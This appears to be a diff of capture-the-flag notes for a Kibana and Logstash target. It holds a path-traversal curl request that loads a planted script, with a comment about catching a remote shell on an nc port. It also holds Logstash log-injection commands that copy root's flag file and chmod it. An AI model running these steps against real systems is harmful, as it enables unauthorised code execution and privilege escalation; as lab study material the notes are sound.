@@ -74,6 +74,9 @@ filter {
 /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml
 
 #notes:
+# this sol creates a file of the root.txt we need
+# a better soln will create an interactive shell.
+
 # curl to get remote and listen on nc port
 curl -v 'http://localhost:9999/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../tmp/.a.js'
 
@@ -83,8 +86,11 @@ logstash_*: /opt/kibana/
 *.conf    : /etc/logstash/conf.d
 logs      : /var/log/logstash
 
-# copy/paste when kibana
+# copy/paste when kibana: it seems to take ~30 minutes for the conf files to be
+# read. Also, maybe have to modify the conf files to trigger.
 cp /etc/logstash/conf.d/input.conf /etc/logstash/conf.d/a.conf; rm /etc/logstash/conf.d/a.conf; cp /etc/logstash/conf.d/input.conf /etc/logstash/conf.d/a.conf
 echo "Ejecutar comando : cp /root/root.txt /tmp/.test.txt" >> /opt/kibana/logstash_0
 echo "Ejecutar comando : chmod 777 /tmp/.test.txt" >> /opt/kibana/logstash_0
 echo "Ejecutar comando : rm /tmp/.test.txt" >> /opt/kibana/logstash_0
+
+
